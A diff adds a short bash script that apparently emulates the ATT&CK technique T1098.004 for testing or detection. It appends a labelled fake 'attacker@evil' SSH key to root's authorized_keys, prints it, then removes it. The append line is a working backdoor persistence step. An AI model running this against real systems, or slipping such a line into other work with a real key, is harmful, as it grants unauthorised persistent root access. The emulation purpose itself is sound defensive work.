@@ -1,0 +1,8 @@
+#!/bin/bash
+
+echo -e `date +"%Y-%m-%d %H:%M:%S"` "\e[92m[T1098.004] Persistence via SSH authorized_keys: an attacker appends their public key to a user's authorized_keys to keep passwordless access. Modifying authorized_keys is a classic backdoor.\033[m"
+mkdir -p /root/.ssh 2>/dev/null
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIattacker-demo-key-not-real attacker@evil" >> /root/.ssh/authorized_keys 2>/dev/null
+tail -n1 /root/.ssh/authorized_keys 2>/dev/null
+# Cleanup: remove the injected key line
+sed -i '/attacker-demo-key-not-real/d' /root/.ssh/authorized_keys 2>/dev/null
